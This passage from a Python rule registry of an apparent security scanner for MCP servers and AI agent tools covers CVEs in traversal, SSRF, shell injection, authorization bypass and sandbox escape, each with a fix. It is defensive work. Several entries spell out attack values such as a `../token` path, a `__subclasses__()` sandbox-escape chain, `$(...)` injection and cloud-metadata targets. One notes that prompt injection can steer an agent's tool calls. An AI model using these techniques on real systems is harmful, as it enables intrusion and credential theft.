    "authorization flaws. Before 0.1.8, `netlicensing_get_product` puts the "
    "caller's `product_number` into the REST path that `nl_get()` requests with "
    "no path-segment check, so a value such as `../token` reaches the token "
    "endpoint. That response is serialized without the token redaction the token "
    "tools apply (0.1.7 added it; earlier releases redact nothing), so an MCP "
    "client holding a non-administrative API key reads API keys and shop URLs in "
    "plaintext, and an administrative key recovered this way gives read, write and "
    "delete access to the NetLicensing account (CVE-2026-57496, CVSS 9.6, CWE-22). "
    "Checked in the wheels: every release from 0.0.6 builds the path unchecked, and "
    "0.1.8 (`b8fd0ea`) validates each path segment before the request is built. "
    "Before 0.1.6, a `/mcp` request that carries none "
    "of `x-netlicensing-api-key`, `Authorization: Bearer` or the `apikey` query "
    "parameter passes straight through `ApiKeyMiddleware`, and `api_key_ctx` then "
    "falls back to the operator's `NETLICENSING_API_KEY`, so an unauthenticated "
    "caller runs every licensing tool, the destructive ones included, as the "
    "operator (CVE-2026-54446, CVSS 8.1, CWE-306).",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `netlicensing-mcp`, or the image, to 0.1.8 or later and pin it. Then "
    "rotate the NetLicensing API keys the server could reach, since any token was "
    "readable through the traversal, and treat licensing objects changed while an "
    "affected version was reachable as suspect. Fail closed on a missing "
    "credential rather than substituting the server's own.",
    sarif_name="NetlicensingMcpAuthFallback",
    cve_references=[
        "CVE-2026-54446",
        # Fixed in 0.1.8, above the old 0.1.6 floor and more severe, so the floor
        # rose and the rule became CRITICAL: one dependency, one finding.
        "CVE-2026-57496",
    ],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AGENT-02", "ADV-INJECT-06"],
    limitations=(
        "Reads `netlicensing-mcp` below 0.1.8 in requirements*.txt at any depth and, "
        "at the project root only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock "
        "lockfiles, taking the lowest version a range allows, and the two images "
        "below 0.1.8 in compose files, Kubernetes manifests, Helm values, Dockerfiles "
        "and MCP configs. A reference must state a version to be reported: `latest`, "
        "the two-part image tag `0.1` and the README's unpinned `uvx netlicensing-mcp` "
        "all resolve to 0.1.10, which is fixed. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader "
        "does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is "
        "not read."
    ),
)


_r(
    "AAK-MCP-KNOWNS-CVE-2026-86439-001",
    "knowns MCP doc/memory and code.find tools: path traversal outside the project directory (no fixed release)",
    "knowns (`knowns`, npm — knowns-dev) before 0.30.0 does not validate filesystem "
    "paths supplied in MCP tool arguments, so an attacker-controlled path containing "
    "directory-traversal sequences reads, creates, overwrites or deletes files "
    "outside the project directory (CVE-2026-86439, CVSS 8.8). NVD scopes the read "
    "reach to \"arbitrary Markdown files accessible to the server process\", which "
    "follows from where the defect sits: the document and memory stores "
    "(`internal/storage/doc_store.go`, `internal/storage/memory_store.go`) are "
    "Markdown-backed. Fixed in v0.30.0. CVE-2026-88938 (MEDIUM 6.5) then reopened "
    "the same class on a different tool: `knowns` **through 0.33.0** does not "
    "confine the `path` argument of the `code.find` MCP tool to the project root, "
    "so an agent session supplies an absolute path or traversal sequence and "
    "retrieves full file contents from anywhere the server process can read. "
    "0.33.0 is the newest published release (npm, 2026-09-05) and is itself in the "
    "affected range, so **there is no fix floor to upgrade to** and this pin is "
    "presence-only: it fires on any referenced version. That is the permanent "
    "state until upstream ships a fix, not a placeholder — the same shape as the "
    "`postgres-mcp` and `mcp-florence2` pins in this table.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "No fixed release exists: 0.33.0 is the newest and is affected. Until upstream "
    "ships one, run `knowns` against a directory that contains nothing the agent "
    "session should not read, or drop it. When a fix lands, upgrade past 0.33.0 and "
    "pin it. The upstream fix has to resolve every path taken from a tool argument "
    "and reject any result that escapes the project root before opening it.",
    sarif_name="KnownsMcpPathTraversal",
    cve_references=["CVE-2026-86439", "CVE-2026-88938"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-DATA-01"],
    limitations=(
        "Reads `knowns` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, and reports "
        "every version from 0.1.1 on, a future fixed one included, until the pin "
        "gets a floor. The dependency is not read when it is declared in a "
        "sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` "
        "or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). The npm release 0.1.0 is affected too but is not "
        "reported, because the same number belongs to an unrelated PyPI package of "
        "that name. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-DEST-UNVALIDATED-001",
    "MCP-configured destination reaches an outbound fetch with no guard (absence or asymmetry)",
    "A destination that arrives through MCP server / webhook configuration — "
    "`server_url`, `webhook_url`, `mcp_server_url` and the like — is passed to an "
    "outbound HTTP call without a destination check, so a caller who can write that "
    "configuration steers the server at internal addresses and cloud metadata "
    "endpoints (`http://169.254.169.254/`). Two disclosed shapes, one defect. "
    "**Absence** (CVE-2026-86122, Rowboat through 0.9.1, CVSS 5.0): nothing in the "
    "module resolves or range-checks a destination at all. **Asymmetry** "
    "(CVE-2026-85666, OGX / ex-Llama Stack, CVSS 7.5): the guard exists and is "
    "called — OGX applies `validate_url_not_private()` to its other URL inputs — "
    "and is simply not applied to this one; on the default starter configuration, "
    "which runs unauthenticated, that also forwards attacker-supplied headers and "
    "bearer tokens to the chosen destination. The asymmetry arm is the higher-"
    "precision signal, and it is the same class this scanner already detects at two "
    "other layers: `AAK-MCPWN-001` (auth middleware present on one route but not "
    "its twin) and `AAK-MCP-TOOLGATE-ASYMMETRY-001` (a gate enforced in "
    "`tools/list` but not `tools/call`). Those two rules carry their own CVEs and "
    "are named here as the family, not as coverage this rule provides.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Validate the destination on every path that can reach an outbound call, not on "
    "the paths that happened to get a guard first. Resolve the host once, reject "
    "private, loopback, link-local and metadata ranges on the *resolved IP*, and "
    "connect to that pinned address. Where a guard already exists in the module, "
    "the fix is usually to call it here too rather than to write a second one — and "
    "never forward caller-supplied `Authorization` headers to a destination the "
    "caller also chose.",
    sarif_name="McpConfiguredDestinationUnvalidated",
    cve_references=["CVE-2026-85666", "CVE-2026-86122"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-NET-01"],
    limitations=(
        "Python only, and scoped to configuration-shaped destination names. A "
        "caller-supplied URL arriving as a tool *argument* is AAK-MCP-SSRF-001's "
        "surface, not this rule's; bare `url` is deliberately not matched because it "
        "is the most common identifier in any HTTP code."
    ),
)


_r(
    "AAK-SANDBOX-DENYLIST-001",
    "Deny-list of names used as a Python sandbox boundary, with the lookup builtins still reachable",
    "Caller-supplied Python is inspected against a deny-list of attribute and "
    "builtin *names* held as strings, then executed in-process — while `getattr`, "
    "`__getattribute__`, `vars` or `globals` remain reachable. A deny-list over "
    "names is not a boundary when the name can be reached through a lookup: a "
    "caller walks `literal.__class__.__base__.__subclasses__()` to a reference the "
    "list never mentioned, and arrives at `subprocess` without typing any denied "
    "token. ToolUniverse's `python_code_executor` is the exemplar "
    "(CVE-2026-81096, CVSS 10.0, unauthenticated); RestrictedPython's `getattr` "
    "bypass in mcp-context-forge (CVE-2026-53710) is the same defect in a "
    "different product, which is what makes it a class. A deny-list that also "
    "denies the lookup primitives is merely fragile; one that leaves them "
    "reachable is bypassable by construction, and that is what this rule reports.",
    Severity.CRITICAL,
    Category.TRUST_BOUNDARY,
    "Do not gate execution on a list of forbidden names. Run untrusted code in a "
    "separate process with an OS-level boundary — a container, a seccomp profile, "
    "or at minimum a subprocess with dropped privileges and no network — and treat "
    "the in-process namespace as reachable in full. If in-process execution is "
    "unavoidable, invert to an allow-list of permitted builtins and deny the "
    "attribute-lookup primitives with it; and never let a per-call argument widen "
    "the permitted set before the inspection runs, which is the second half of "
    "CVE-2026-81096.",
    sarif_name="DenylistSandboxLookupReachable",
    cve_references=["CVE-2026-81096", "CVE-2026-53710"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-EXEC-01"],
    limitations=(
        "Python only, and requires all four signals together — a deny-list of "
        "names, checked against a value, an in-process exec of that value, and a "
        "still-reachable lookup primitive. An executor that isolates in a "
        "subprocess never matches, by design: the submitted source is not run here."
    ),
)


_r(
    "AAK-MCP-STDIO-UNBOUNDED-BUFFER-001",
    "MCP Kotlin SDK stdio read buffer grows without bound (CVE-2026-53937, 0.7.0–0.12.0)",
    "The MCP Kotlin SDK (`io.modelcontextprotocol:kotlin-sdk`, and the "
    "`kotlin-sdk-core` / `kotlin-sdk-jvm` artifacts that publish the same code) "
    "from 0.7.0 through 0.12.0 appends every chunk received from the stdio "
    "transport into a `kotlinx.io.Buffer` with no size cap. `ReadBuffer.append` "
    "(`kotlin-sdk-core/src/commonMain/kotlin/io/modelcontextprotocol/kotlin/sdk/"
    "shared/ReadBuffer.kt`) only extracts a frame once a `\\n` (0x0a) byte is "
    "observed, so a peer that streams bytes and never sends a newline grows the "
    "buffer indefinitely until the JVM — or the host process around it — is "
    "OOM-killed. `StdioServerTransport` and `StdioClientTransport` amplify it: "
    "both queue raw chunks through a `Channel<ByteArray>(Channel.UNLIMITED)` and "
    "then call `readBuffer.append(chunk)` with neither backpressure nor a size "
    "guard. CVE-2026-53937, CVSS 6.2 MEDIUM "
    "(`AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`), CWE-400 + CWE-770. The impact is "
    "availability only, and the attack vector is local because it arrives on "
    "stdin — but it is pre-authentication, and the reach is remote wherever an "
    "untrusted producer feeds that stdin: a host that exec's the server as a "
    "subprocess and pipes bytes from a network peer, or a sidecar proxying an "
    "HTTP endpoint onto the stdio transport. Fixed in 0.13.0. The affected range "
    "starts at 0.7.0 because that is the first release of `kotlin-sdk-core`, "
    "where the buffer lives — a module boundary, not the commit that introduced "
    "the defect.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `io.modelcontextprotocol:kotlin-sdk` (or `kotlin-sdk-core` / "
    "`kotlin-sdk-jvm`) to >= 0.13.0 and pin it. Until then, do not let an "
    "untrusted producer write directly to an SDK stdio server's stdin: put a "
    "framing proxy in front that enforces a maximum bytes-without-newline budget "
    "and drops the peer when it is exceeded, and bound the queue between the "
    "reader and the parser rather than using `Channel.UNLIMITED`.",
    sarif_name="McpKotlinSdkStdioUnboundedReadBuffer",
    cve_references=["CVE-2026-53937"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-RES-01"],
    incident_references=["NVD-CVE-2026-53937"],
    limitations=(
        "Dependency-level detection on JVM manifests only — `build.gradle`, "
        "`build.gradle.kts`, `gradle/libs.versions.toml` and `pom.xml`. A finding "
        "requires a version that actually resolved into 0.7.0–0.12.0, so a dynamic "
        "version (`0.+`, `latest.release`) or a `version.ref` pointing at a catalog "
        "outside the scanned tree is deliberately not reported. It does not detect "
        "the unbounded-buffer shape in first-party code."
    ),
)


def get_rule(rule_id: str) -> RuleDefinition:
    """Retrieve a rule definition by its unique ID.

    Args:
        rule_id: The rule identifier (e.g., "AAK-MCP-001").

    Returns:
        The matching RuleDefinition.

    Raises:
        KeyError: If the rule_id is not registered.
    """
    return RULES[rule_id]

# ---------------------------------------------------------------------------
# 2026-09-26 wave (#808-#817). Ten watcher-filed CVEs: two new pins below, the
# OpenClaw floor raised in place, four more mcp-atlassian advisories recorded
# against its 0.22.0 floor, one out of scope and two deferred with a date. The
# dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-REMOTE-CVE-2026-51994-001",
    "mcp-remote 0.1.16–0.1.38 trusts URLs a remote MCP server chooses (SSRF, browser launch)",
    "`mcp-remote`, the npm proxy that connects stdio MCP clients to remote MCP "
    "servers over OAuth, trusts URLs the remote server chooses. From 0.1.32 through "
    "0.1.38 it fetches the `resource_metadata` URL a server puts in its "
    "`WWW-Authenticate` header with no scheme, hostname or private-address policy "
    "(CVE-2026-51994, CVSS 3.1 9.1, CWE-918), and it fetches "
    "`/.well-known/oauth-authorization-server` from an authorization-server origin "
    "taken from server-controlled metadata without validating that origin "
    "(CVE-2026-51995, CVSS 3.1 7.5). A malicious or compromised MCP server therefore "
    "makes the client request localhost services, private-network addresses or cloud "
    "metadata endpoints during OAuth discovery, before any tool is called. From "
    "0.1.16, the release that added a URL check before opening the user's browser, "
    "that check accepts any HTTP(S) URL and lets loopback, private, link-local and "
    "metadata destinations through to the browser launch (CVE-2026-51997, CVSS 3.1 "
    "8.8). In the same 0.1.16–0.1.38 range NVD records CVE-2026-51996 (CVSS 3.1 9.8, "
    "CWE-328) as code execution through `getServerUrlHash` in `src/lib/utils.ts`, "
    "which names each server's OAuth state and token files from an MD5 hash; the "
    "advisory NVD cites (F-04) was corrected in its v1.0.1 to call this hardening, "
    "with no token takeover shown. From 0.1.18 NVD also records CVE-2026-52001 "
    "(CVSS 3.1 7.5 from CISA-ADP, CWE-200) as information disclosure through the SSE "
    "transport's `eventSourceInit` fetch wrapper, which adds the bearer token with no "
    "origin check of its own; its advisory (F-11) was likewise corrected in v1.0.1 to "
    "defense in depth, because the SDK and undici versions it reviewed keep the token "
    "from crossing origins. The range is the union of the advisories': they were reconfirmed against "
    "0.1.38, and upstream has published neither an advisory nor a fix, so this rule "
    "makes no claim about 0.1.39 or later in either direction.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Move off 0.1.16–0.1.38 and pin the release you move to. Upstream names no fixed "
    "version, so check that it validates discovery and authorization URLs before "
    "trusting it. Connect `mcp-remote` only to MCP servers you trust, and where the "
    "client host can reach metadata or admin endpoints, put an egress policy in front "
    "of it that blocks loopback, link-local and private destinations on every request "
    "and redirect.",
    sarif_name="McpRemoteServerChosenUrls",
    cve_references=[
        "CVE-2026-51994", "CVE-2026-51995", "CVE-2026-51996", "CVE-2026-51997",
        "CVE-2026-52001",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reports only a reference that states a version in the range: an "
        "`mcp-remote@0.1.x` argument in an MCP config, a `package.json` dependency "
        "or a lockfile entry. An unpinned `npx mcp-remote` is not reported, because "
        "it resolves to the newest release (0.14.x on 2026-09-27), which the "
        "advisories did not test. Versions before 0.1.16 carry CVE-2025-6514 (OS "
        "command injection through the authorization endpoint URL, fixed in 0.1.16), "
        "which this rule does not report. A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)

_r(
    "AAK-MCP-KIMICODE-CVE-2026-95660-001",
    "Kimi Code up to 0.31.0 starts a workspace's MCP servers before the trust prompt",
    "Kimi Code (`@moonshot-ai/kimi-code`), Moonshot AI's coding agent CLI, through "
    "0.31.0 loads the MCP configuration of the workspace it is opened in "
    "(`agent-core-v2/src/agent/mcp/config-loader.ts`) and spawns the STDIO servers a "
    "repository's `.mcp.json` declares before asking whether the workspace is "
    "trusted, so opening a cloned repository runs commands its author chose "
    "(CVE-2026-95660, CVSS 3.1 6.3, CWE-77/CWE-78). 0.31.1 adds the trust prompt and "
    "resolves `fd` and `stty` to absolute paths, so an untrusted workspace can no "
    "longer plant bare-name executables on `$PATH` before confirmation either.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@moonshot-ai/kimi-code` to >= 0.31.1 and pin it. Until then, do not "
    "open untrusted repositories with Kimi Code, and read a repository's `.mcp.json` "
    "before opening it.",
    sarif_name="KimiCodeUntrustedWorkspaceMcpAutostart",
    cve_references=["CVE-2026-95660"],
    owasp_mcp_references=["MCP04:2025", "MCP09:2025"],
    owasp_agentic_references=["ASI04", "ASI09"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports the package where a manifest pins it. Most installs are global "
        "(`npm i -g`) and leave no file in a project, so this catches a project that "
        "declares Kimi Code as a dependency, not every machine that runs it. The "
        "project-side half of the attack, the `.mcp.json` a hostile repository "
        "ships, is what the MCP config rules read. A file over 2 MB, or a lockfile "
        "over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-02 wave (#833-#842). Ten watcher-filed CVEs: one new pin below, two
# CVEs listed on the mcp-remote and OpenClaw pins they fall inside, two out of
# scope, and four on self-hosted MCP gateways shipped as container images,
# deferred with a date. The dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-PILLMWIKI-CVE-2026-102911-001",
    "pi-llm-wiki below 0.11.8 runs a shell on the URL its MCP capture tool is given",
    "`@zosmaai/pi-llm-wiki`, an Obsidian-compatible wiki package for the pi coding "
    "agent that also ships an MCP server, passes the `url` argument of its "
    "`wiki_capture_source` MCP tool into a shell command, `sh -c \"uvx ... markitdown "
    "\\\"${source}\\\"\"`, so a caller that controls the argument runs commands on the "
    "host (CVE-2026-102911, CVSS 3.1 9.9, CWE-77/CWE-78). Double quotes do not stop "
    "`$(...)` or backticks. 0.11.8 calls markitdown with an argument list and no "
    "shell (fix commit `36086703`). NVD scopes it \"up to 0.11.7\" with no lower "
    "bound, and the shell call is in the upstream source from May 2026, months "
    "before 0.11.0, so every stated version below 0.11.8 is reported.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `@zosmaai/pi-llm-wiki` to >= 0.11.8 and pin it. Until then, do not "
    "expose the wiki MCP server to a model or caller that can choose the URL "
    "`wiki_capture_source` captures.",
    sarif_name="PiLlmWikiCaptureSourceShellInjection",
    cve_references=["CVE-2026-102911"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reports only a reference that states a version: a `package.json` "
        "dependency, a lockfile entry, or `@zosmaai/pi-llm-wiki@0.x` in an MCP "
        "config. Upstream registers the MCP server by its path inside "
        "`node_modules`, which states no version, and `pi install npm:...` records "
        "the package in pi's own settings, which this scanner does not read, so a "
        "machine-wide install is not seen. npm's unscoped `pi-llm-wiki` is a "
        "different author's package and is not matched. A file over 2 MB, or a "
        "lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-03 wave (#845-#854). Ten watcher-filed CVEs: one new pin below, one
# CVE listed on AAK-MCP-SSRF-001, three WordPress plugins and heym out of scope
# as non-pinnable, and four deferred with a date (the Obot pair with #837 and
# #842, mcp-chrome-bridge and SurfSense for want of an upstream fix). The
# dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-FASTMCPTELEGRAM-CVE-2026-55096-001",
    "fast-mcp-telegram below 0.30.1 fetches attachment URLs its SSRF guard never resolved",
    "`fast-mcp-telegram`, a Telegram MCP server, downloads the http(s) URLs given "
    "to its `send_message` and `send_message_to_phone` MCP tools and attaches them "
    "to the outgoing message. Before 0.30.1 the guard, `_validate_url_security`, "
    "compares the URL's literal hostname with a denylist and never resolves it, "
    "while the fetch (`httpx.AsyncClient.get`) resolves the name itself. A "
    "hostname that resolves to a loopback, private or link-local address "
    "therefore passes the guard and is fetched, even with `block_private_ips=True` "
    "and `allow_http_urls=False`, and the body comes back to the caller as a "
    "Telegram attachment, so the read is not blind (CVE-2026-55096, CVSS 3.1 7.1, "
    "CWE-918/CWE-184). 0.30.1 resolves the name with `socket.getaddrinfo` and "
    "blocks loopback, private and link-local results (fix commit `e6b3032c`). NVD "
    "and the advisory print the fixed version as \"30.1\"; the release on PyPI "
    "and the GitHub tag are 0.30.1.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `fast-mcp-telegram` to >= 0.30.1 and pin it. Until then, do not let "
    "an untrusted caller choose the attachment URLs `send_message` downloads, or "
    "run the server where loopback, private and cloud-metadata addresses are "
    "unreachable.",
    sarif_name="FastMcpTelegramAttachmentSsrf",
    cve_references=["CVE-2026-55096"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reports a reference that names the package: a requirements, pyproject or "
        "lockfile entry, or `fast-mcp-telegram` in an MCP config, where an unpinned "
        "`uvx fast-mcp-telegram` is reported as unpinned, as for the other PyPI "
        "pins. It reads versions, not code: the defect's shape, a hostname-only "
        "guard before a fetch that resolves again, is the class "
        "`AAK-SSRF-TOCTOU-001` names, which recognises this guard in code since #855 "
        "and keeps firing on 0.30.1's source, whose fetch still resolves the name a "
        "second time. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# Container image pins (scanners/container_image_pins.py). Self-hosted MCP
# platforms that ship only as container images, where the image tag is the only
# thing that carries the version: the Obot and MetaMCP CVEs deferred on
# 2026-10-02 and 2026-10-03 for want of this reader (#836-#838, #842, #848,
# #849), and heym (#854), recorded then as non-pinnable for the same reason.
# ---------------------------------------------------------------------------

_IMAGE_PIN_LIMITATIONS = (
    "Reads image references only: an `image:` value or any other mention of "
    "`REPO:TAG` in YAML (compose files, Kubernetes manifests, MCP configs), a Helm "
    "values mapping of `repository` (or `registry` + `repository`) and `tag`, "
    "Dockerfile and Containerfile `FROM`, and `docker run` arguments in "
    "`*mcp*.json` and `claude_desktop_config.json`. A tag that is not a version "
    "(`main`, `main-20250617`, `dev`), a digest with no tag, an interpolated tag "
    "(`:${VERSION}`, `{{ .Values.tag }}`) and a Helm `tag` left empty (the chart's "
    "appVersion decides) state no version and are not reported. A two-part tag "
    "such as `0.24` stands for the newest patch on that line and is reported only "
    "when the whole line sits below the fixed version. "
    "Mirrors under another registry are not matched, and commented-out lines are "
    "skipped."
)

_r(
    "AAK-MCP-OBOT-CVE-2026-101084-001",
    "Obot image below v0.25.0: MCP gateway access-control bypasses, open OAuth client registration, SSRF",
    "Obot, a self-hosted MCP gateway, ships as the container image "
    "`ghcr.io/obot-platform/obot` and a Helm chart, so the image tag is the only "
    "thing that states which release a deployment runs. Before v0.21.1 the "
    "`/mcp-connect` endpoint does not enforce Access Control Rules, so any "
    "authenticated user who has a server ID can connect to an MCP server the "
    "administrator restricted to other groups and call its tools with the stored "
    "OAuth credentials (CVE-2026-101084, CVSS 3.1 9.6, CWE-639, "
    "GHSA-vw82-7fv8-r6gp). v0.21.1 added `/mcp-connect/` to the deny list in "
    "`checkUI`, but `/mcp-connect-composite/{mcp_id}` reaches the same "
    "`mcpGateway.Proxy` without that prefix, so a Basic-role user with a composite "
    "MCP ID still gets through (CVE-2026-103758, CVSS 8.1, CWE-863, "
    "GHSA-6fwv-3h4c-37j9: 0.21.1 through 0.24.1, no patched version named). Before "
    "v0.23.0, with authentication enabled, OAuth dynamic client registration needs "
    "no authentication and accepts any redirect URI, and the authorization flow "
    "auto-completes for a logged-in user, so one crafted link hands an attacker's "
    "client an access token (CVE-2026-101062, CVSS 8.8, CWE-863); and remote MCP "
    "server registration fetches any URL a Power User supplies, including internal "
    "services and cloud metadata, with the response echoed in error messages "
    "(CVE-2026-101064, CVSS 7.6, CWE-918). Also before v0.23.0, with registry "
    "authentication enabled, the MCP Registry endpoints under `/v0.1/*` answer "
    "without authentication, so anyone can list server names, descriptions, "
    "repository URLs and connect URLs (CVE-2026-101063, CVSS 5.3, CWE-862, "
    "GHSA-pr6h-vr44-xq8j). v0.25.0 is the first release whose "
    "`checkUI` authorizes only the UI's own fallback route "
    "(obot-platform/obot#7375). v0.24.2, cut from the 0.24 branch after it, still "
    "has the 0.24.1 deny list and is reported.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Run `ghcr.io/obot-platform/obot` at v0.25.0 or later and pin that tag (or its "
    "digest) in compose files, manifests and Helm values. Until then, expose the "
    "gateway only to users trusted with every MCP server behind it, since Access "
    "Control Rules do not separate them.",
    sarif_name="ObotImageGatewayAuthzBypass",
    cve_references=[
        "CVE-2026-101084", "CVE-2026-101062", "CVE-2026-103758", "CVE-2026-101064",
        "CVE-2026-101063",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01", "ADV-SSRF-01"],
    limitations=(
        _IMAGE_PIN_LIMITATIONS + " `latest` (or no tag) is not reported: it was "
        "v0.26.2 on 2026-10-03. The enterprise image "
        "`ghcr.io/obot-platform/obot-enterprise` is a different image and is not "
        "matched."
    ),
)

_r(
    "AAK-MCP-METAMCP-CVE-2026-79538-001",
    "MetaMCP image up to 2.4.22: inspector proxy code execution and cross-tenant session dispatch (no fixed release)",
    "MetaMCP, a self-hosted MCP aggregator and gateway, ships as the container "
    "image `ghcr.io/metatool-ai/metamcp`, which its compose file pulls at "
    "`:latest`. Its root `package.json` is private, and npm's "
    "`@metamcp/mcp-server-metamcp` is a separate client proxy, so the image tag is "
    "the only thing that carries its version. Up to and including 2.4.22 the "
    "internal MCP inspector proxy endpoint `GET /mcp-proxy/server/stdio` takes the "
    "STDIO process parameters from the request instead of from a server record the "
    "caller owns, so any logged-in user (self-registration is on by default) can "
    "run commands in the application container (CVE-2026-79538, CVSS 3.1 9.8, "
    "CWE-94). Through 2.4.22 the session store is keyed only by the "
    "client-supplied `mcp-session-id`, the endpoint middleware never checks who "
    "owns the session, and `GET /metamcp/health/sessions` lists live session IDs "
    "without authentication, so a caller can list and call another tenant's MCP "
    "tools with that tenant's forwarded credentials (CVE-2026-79537, CVSS 9.1, "
    "CWE-639). There is no fixed release: 2.4.22 (2025-12-19) is the newest release "
    "and image tag, and the TraceForce advisories NVD cites list 2.4.22 and the "
    "newest `main` commit as affected with no patched version. On 2026-10-03 the "
    "`latest`, `2` and `2.4` tags were the same image as `2.4.22`, so `latest` and "
    "an untagged reference are reported too.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "There is no patched image to move to. Keep MetaMCP off public networks, block "
    "the `/mcp-proxy/` and `/metamcp/health/` paths at the reverse proxy, turn off "
    "open self-registration, and rotate every secret in the environment of a "
    "deployment that was exposed.",
    sarif_name="MetaMcpImageInspectorProxyRce",
    cve_references=["CVE-2026-79538", "CVE-2026-79537"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01", "ADV-AUTH-01"],
    limitations=(
        _IMAGE_PIN_LIMITATIONS + " `latest` and an untagged reference are reported "
        "because `latest` was 2.4.22 on 2026-10-03; once a fixed image takes "
        "`latest`, that arm reports a patched deployment until the pin moves. The "
        "floating `2` and `2.4` tags are not reported, though both were 2.4.22 on "
        "that date. A release "
        "after 2.4.22 is outside NVD's range and is not reported, which is not a "
        "claim that it is fixed."
    ),
)

_r(
    "AAK-MCP-HEYM-CVE-2026-100858-001",
    "heym image below 0.0.109 fetches workflow-node URLs past its SSRF guard",
    "heym, a self-hosted workflow platform with MCP nodes, is on neither PyPI nor "
    "npm and ships as the container image `ghcr.io/heymrun/heym`. Before 0.0.109 "
    "its Slack, Discord and Crawler workflow nodes send HTTP requests to URLs taken "
    "from user-created credentials (`webhook_url`, `flaresolverr_url`) through an "
    "HTTP client without the SSRF egress guard that already covers the HTTP, "
    "WebSocket and MCP nodes, and the credential API checks only that the URL is "
    "non-empty. Any registered user can point a credential at a loopback, private, "
    "link-local or cloud-metadata address and run a workflow (CVE-2026-100858, "
    "CVSS 3.1 6.8, CWE-918, GHSA-39j3-6x3x-8rcr).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Run `ghcr.io/heymrun/heym` at 0.0.109 or later and pin that tag (or its "
    "digest). Until then, run the backend where internal and cloud-metadata "
    "addresses are unreachable.",
    sarif_name="HeymImageWorkflowNodeSsrf",
    cve_references=["CVE-2026-100858"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        _IMAGE_PIN_LIMITATIONS + " `latest` (or no tag) is not reported: it was "
        "0.0.123 on 2026-10-03. heym's own compose file builds a local image "
        "(`heym-backend:local` unless `HEYM_BACKEND_IMAGE` is set), which states no "
        "version."
    ),
)

# ---------------------------------------------------------------------------
# 2026-10-03 wave, second batch (#863-#867). Five watcher-filed CVEs: two new
# pins below, and three WordPress plugins out of scope as non-pinnable. The
# dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-OFFICEPPT-CVE-2025-71427-001",
    "Office-PowerPoint-MCP-Server tools read and write any path they are given (no fixed release)",
    "`office-powerpoint-mcp-server` (PyPI; GongRzhe/Office-PowerPoint-MCP-Server) "
    "hands the paths its MCP tools receive to the filesystem without confining them "
    "to a working directory: `save_presentation` and `open_presentation` take any "
    "`file_path`, and `manage_image` any `output_path`. An absolute path or a `../` "
    "sequence therefore overwrites any file the server's user can write, or loads "
    "one from outside the working directory, and an indirect prompt injection that "
    "steers the agent's tool calls is enough (CVE-2025-71427, CVSS 3.1 6.8, CWE-22, "
